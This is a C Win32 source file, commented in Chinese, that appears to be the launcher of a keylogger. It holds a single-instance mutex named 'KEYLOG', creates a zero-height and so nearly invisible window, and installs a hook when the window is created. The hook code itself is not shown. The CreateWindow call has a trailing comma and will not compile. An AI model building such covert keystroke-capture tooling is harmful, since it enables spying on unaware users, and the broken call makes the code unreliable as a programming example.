#include "winHead.h"


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstanc, LPSTR lpCmdLine, int nCmdShow) {
	// 确保程序为单一运行的实例
	if (IsAlreadyRun()) {
		MessageBoxA(NULL, "程序已经运行！", "错误", MB_OK);
		return -1;
	}
	
	// 设计窗口类
	WNDCLASS wc = { 0 };
	TCHAR szWinClassName[] = TEXT("lue");

	wc.hbrBackground = CreateSolidBrush(RGB(0, 0, 0));	// 窗口背景
	wc.hInstance = hInstance;	// 实例句柄 
	wc.lpfnWndProc = WindowProc;	// 窗口处理函数
	wc.lpszClassName = szWinClassName;	// 窗口类型名
	wc.style = CS_HREDRAW | CS_VREDRAW;	// 窗口类风格

	// 注册窗口类
	RegisterClass(&wc);

	// 创建窗口
	HWND hWnd = CreateWindow(
		szWinClassName,
		TEXT("阿巴阿巴"), // 窗口标题
		WS_OVERLAPPEDWINDOW,	// 窗口风格
		100, 100,	// 窗口左上角坐标
		250, 0,	// 窗口宽高
		NULL,	// 父窗口句柄
		NULL,	// 菜单句柄
		hInstance,	// 应用程序实例句柄
		NULL,	// 附加信息
		);

	// 显示窗口
	ShowWindow(hWnd, SW_SHOW);

	// 更新窗口
	UpdateWindow(hWnd);

	// 消息循环
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);	// 转化消息
		DispatchMessage(&msg);	// 分发消息
	}

	return 0;
}

BOOL IsAlreadyRun()
{
	HANDLE hMutex = NULL;
	// 创建互斥锁
	hMutex = CreateMutexA(NULL, FALSE, "KEYLOG");
	if (hMutex)
		if (ERROR_ALREADY_EXISTS == GetLastError())
			return TRUE;
	return FALSE;
}

LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	switch (uMsg) {
	case WM_CREATE:	//窗口创建
		InstallHook();
		break;
	case WM_CLOSE:	// 窗口关闭消息
		DestroyWindow(hWnd);	// 销毁窗口
		break;
		
	case WM_DESTROY:	// 窗口退出消息
		UninstallHook();
		PostQuitMessage(0);	// 退出窗口
		break;
	}

	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}
